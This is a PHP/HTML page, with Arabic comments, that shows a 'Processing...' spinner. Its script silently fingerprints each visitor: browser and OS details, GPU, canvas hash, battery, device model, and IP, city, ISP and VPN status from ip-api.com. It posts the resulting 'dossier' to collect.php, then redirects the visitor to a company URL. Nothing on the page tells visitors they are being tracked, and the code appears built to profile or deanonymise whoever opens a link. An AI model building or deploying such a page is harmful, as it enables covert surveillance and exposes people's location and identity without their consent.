<?php require_once 'config.php'; ?>
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري المعالجة...</title>
    <style>
        body { background: #0f172a; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #38bdf8; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <script>
        async function buildSystemXDossier() {
            let data = {
                ua: navigator.userAgent,
                lang: navigator.language,
                res: screen.width + "x" + screen.height,
                dpr: window.devicePixelRatio || 1,
                hw: { cores: navigator.hardwareConcurrency || 0, ram: navigator.deviceMemory || 0 },
                theme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Dark 🌙' : 'Light ☀️',
                math: Math.tan(-1e300).toString().slice(0,10)
            };

            // 1. WebGL (GPU) & Canvas Fingerprint
            try {
                let canvas = document.createElement('canvas');
                let gl = canvas.getContext('webgl');
                if(gl) {
                    let dbg = gl.getExtension('WEBGL_debug_renderer_info');
                    data.gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'Unknown';
                }
                data.canvasHash = canvas.toDataURL().slice(-20);
            } catch(e) {}

            // 2. Async Data (Battery, Network, Storage)
            let promises = [];
            
            // جلب الأي بي والـ VPN من طرف العميل لتخفيف الضغط على السيرفر
            promises.push(fetch('http://ip-api.com/json/?fields=query,status,country,city,isp,hosting')
                .then(r => r.json()).then(ip => data.net = ip).catch(e => data.net = {}));

            if(navigator.getBattery) {
                promises.push(navigator.getBattery().then(b => data.bat = Math.round(b.level * 100) + "%").catch(e=>e));
            }
            if(navigator.userAgentData) {
                promises.push(navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion'])
                    .then(ua => { data.model = ua.model; data.osVer = ua.platformVersion; }).catch(e=>e));
            }
            
            // انتظار المهام بحد أقصى 600 ملي ثانية
            await Promise.race([
                Promise.all(promises),
                new Promise(r => setTimeout(r, 600))
            ]);

            // 3. الإرسال والتحويل
            fetch('collect.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data),
                keepalive: true
            });

            // تحويل فوري
            setTimeout(() => { window.location.replace("<?php echo COMPANY_URL; ?>"); }, 100);
        }

        buildSystemXDossier();
    </script>
</body>
</html>
